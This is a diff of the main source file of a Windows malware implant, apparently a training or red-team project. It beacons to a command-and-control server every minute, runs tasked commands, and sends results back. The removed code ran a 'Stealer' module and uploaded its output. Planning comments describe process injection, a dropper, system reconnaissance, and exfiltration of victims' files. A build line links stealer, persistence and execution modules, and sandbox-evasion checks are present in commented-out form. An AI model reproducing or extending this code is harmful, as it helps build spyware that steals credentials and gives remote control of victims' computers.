@@ -1,17 +1,76 @@
 #include "implant.h"
 
-#define IMPLANT_ID 1
-
 //Implement Injection
-//Implement Gatherinfo
 //Implement Dropper
 //Implement sendtoC2
 
-//FileExec
-//SitAware
 //FileEnum
 
-//x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe 
+/*
+Notes: GatherInfo - 
+[Currently has Computer name, username, and privileges]
+Read the environment variables
+● List the computer’s network interfaces
+    ○  MAC, IPs, interface names…etc
+● Get the windows version
+● Get the current username and token
+● Get the Computers name
+● Get the Machine GUID
+● List files in a directory
+● Change Directory
+● List all running processes 
+*/
+
+/* To Implement:
+A way to have the binary only run 3
+(If someone clicks it 100 times - only shell)
+
+The encryption that we had
+*/
+
+/* Double Check with Ingi -
+Can the table be for get_commands [ I think args is not in there]
+            { "task_id": 12,
+            "target_implant_id": 1,
+            "command": "whoami",
+            "args": "",
+            "created_on": "dec 01",
+            "status": "done"}
+ */
+
+/*
+This was under execution - idk what it is
+Process Injection: support execution of shellcode in either a
+remote processes (by pid) or via fork & run
+
+Execution: Payload format
+-> Is this the dropper
+
+Implant->File I/O
+The implant should be able to
+1) Read files from the victim machine and send it back to the C2.
+2) Download files from the C2 and write them to disk either
+**encrypted**, or **unencrypted**.
+*/
+
+/* Note to self sort of:
+C2->Database->Implants
+Implant ID: Create an ID for the implant to distinguish is from others
+Computer Name: What computer did it connect from?
+Username: What user are you running as?
+GUID: What is the computer's GUID?
+Integrity: What privileges do you have?
+Connecting IP address: what address did it connect from?
+Session Key: After you negotiated a session key, store it per agent
+Sleep: How often does the agent check in?
+Jitter: How random of a check in is it?
+First Seen: When did the agent first check in?
+Last Seen: When was the the last time you saw the agent?
+Expected Check in: When should you expect to see the agent again?
+*/
+
+
+// x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp execute/execute.cpp situational_awareness/GatherInfo.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe  
 
 void IWillRunForever(void){
     while(true){
@@ -22,10 +81,10 @@ void IWillRunForever(void){
         for(int i = 0; i < num_of_tasks; i++){
             /* Only execute commands that are untouched */
             std::string command = converted_new_item.at(i).at(2);
-            execute(command, converted_new_item.at(i).at(0));
+            std::string args = converted_new_item.at(i).at(3);
+            execute(command, args, converted_new_item.at(i).at(0), IMPLANT_ID);
         }
             
-
         Sleep(60000);
     }
 }
@@ -37,23 +96,6 @@ void registerimplant(void){
     return;
 }
 
-void execute(std::string command, int task_id){
-
-    /* Stealer Function */
-    json data_from_driver;
-    std::string results;
-    if(command.compare("Stealer") == 0){
-        printf("Executing Stealer");
-        data_from_driver = driver();
-        results = data_from_driver.dump();
-
-        /* Send the response back to the server */
-        HttpResponse("/response", IMPLANT_ID, task_id, results, "success", command);
-    }
-
-
-}
-
 int main(int argc, char* argv[]){
 
     /* Registering Implant */
@@ -61,25 +103,14 @@ int main(int argc, char* argv[]){
 
     /* HOW ARE WE GETTING IMPLANT ID?*/
 
-    /* Persistance */
-    // before publishing - the bat file needs to load the implant.exe
-    // persist_execution();
-
     /* Sandbox Detection */
+    printf("Executing Sandbox Detection\n");
     // if (vmCheck() || vmDriverCheck() || sandboxTimeCheck()) {
-    // 	exit(0);
+    //     exit(0);
     // }
-
+    
     /* Receive Tasks, Execute Tasks, Send Back Tasks */
     IWillRunForever();
-
-
-
-    
-    /* for sake of testing*/
-    // std::string new_item = "[[3,1,\"Stealer\",\"Fri, 09 Dec 2022 23:41:29 GMT\",\"untouched\",null,null,null,\"test\"]]";
-
-    
 
     return 0;
 }
